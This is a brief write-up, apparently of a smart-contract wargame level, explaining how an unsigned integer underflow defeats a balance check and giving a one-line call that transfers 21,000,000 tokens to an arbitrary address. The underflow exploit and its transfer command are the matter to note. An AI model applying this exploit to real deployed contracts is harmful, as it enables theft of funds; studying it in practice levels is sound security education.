#  As long as `msg.sender` has some ETH, `require(balances[msg.sender] - _value >= 0);` will always be true due to unsigned integer's overflow. Therefore, I can use the transfer function and send money to any address!

`contract.transfer('0x52E84E4D7b64B5587ABfaf2f98F133726553FA13', 21000000)`